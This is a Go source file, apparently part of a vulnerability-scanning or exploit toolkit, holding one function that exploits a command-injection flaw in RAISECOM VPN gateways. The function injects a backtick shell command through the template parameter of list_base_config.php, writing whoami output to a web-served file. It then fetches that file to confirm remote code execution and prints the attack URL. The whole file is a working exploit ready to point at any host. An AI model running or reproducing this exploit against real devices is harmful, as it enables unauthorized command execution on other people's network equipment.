package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func RAISECOM_RCE(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/vpn/list_base_config.php?type=mod&parts=base_config&template=`whoami>/www/tmp/ycxhhh.php`", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/tmp/ycxhhh.php", url)

	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if response2.StatusCode == 200 && !strings.Contains(string(body), "PAGE LOADING") && !strings.Contains(string(body), "404 Not Founde") {
		fmt.Println("[*]RAISECOM_RCE : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/vpn/list_base_config.php?type=mod&parts=base_config&template=`whoami>/www/tmp/ycxhhh.php`\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
